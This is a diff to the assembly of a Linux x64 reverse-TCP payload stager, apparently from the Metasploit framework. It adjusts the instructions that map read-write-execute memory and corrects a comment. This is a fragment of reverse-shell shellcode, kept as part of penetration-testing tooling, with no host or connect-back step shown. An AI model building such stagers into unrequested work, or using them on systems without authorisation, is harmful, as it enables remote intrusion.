@@ -95,7 +95,7 @@ module Payload::Linux::ReverseTcp_x64
 
     asm = %Q^
       mmap:
-        xor    rdi, rdi
+        xor    edi, edi
         push   0x9
         pop    rax
         cdq
@@ -104,8 +104,9 @@ module Payload::Linux::ReverseTcp_x64
         xor    r9, r9
         push   0x22
         pop    r10
-        mov    dl, 0x7
-        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
+        push   0x7
+        pop    rdx
+        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
         test   rax, rax
         js failed
 
